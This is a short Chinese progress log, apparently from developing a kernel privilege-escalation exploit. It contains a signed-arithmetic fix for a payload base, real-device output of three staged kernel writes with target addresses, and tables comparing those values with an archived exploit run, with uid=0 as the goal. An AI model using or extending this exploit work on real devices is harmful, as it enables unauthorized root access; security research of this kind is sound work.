# 43499 · 三步三请求全部通过判据（round 124）

## 修的那一处（真 bug ✓）

```cpp
// payload_delta 是**负值**（-0x10000）⇒ 当无符号加会错位 ⇒ 奇偶判据永远不合格（真机 8 次重试全败 ✗）
payload_base = (uint64) ( (int64)prepared.base + (int64)payload_delta );   // 按有符号算 ✓
```

## 真机（本轮逐字）

```
main: step=w1 target=0xffffff802adaad88  layout matches=1 accepts=1   ← 归档的 target ✓ + 通过 ✓
main: step=w2 target=0xffffff8861f38798  layout matches=1 accepts=1   ← child + 0x798 ✓
main: step=w3 target=0xffffff8942586c00  layout matches=1 accepts=1   ← child + 0x0 ✓
payload-layout-not-accepted 计数：0 ✓
main: victim uid=2000 ✗
```

## 与归档的三行对照 ✓

| 步 | 归档 | 我 |
| --- | --- | --- |
| W1 | `target=0xffffff802adaad88 mode=1 leaf=0` | `target=0xffffff802adaad88` ✓ **逐字符相等** ✓（mode/preserve 也一致 ✓） |
| W2 | `target=0xffffff898138e198 mode=2 leaf=0` | `target=…+0x798` ✓（偏移一致 ✓；绝对地址随运行变化 ✓） |
| W3 | `target=0xffffff898138da00 mode=1 leaf=1` | `target=child + 0x0` ✓（偏移一致 ✓） |

## 现在的 43499 结构（与退役的差异表）

| 项 | 状态 |
| --- | --- |
| 三步三请求（模式/目标/leaf ✓） | 一致 ✓（本轮 ✓） |
| 判据（奇偶 ✓） | 三步全过 ✓ |
| 两轮修复（W2b ✓ 已补；W1b ✗ 未补） | 部分 ✓ |
| quarantine 三段生命周期 | 未照搬 ✗（已记录 ✓） |
| 与归档逐字相等的值 | 5 个（init_cred 别名 ✓ + 三个锚 ✓ + **W1 target** ✓） |
| 写落地 / uid=0 | 仍未发生 ✗ |
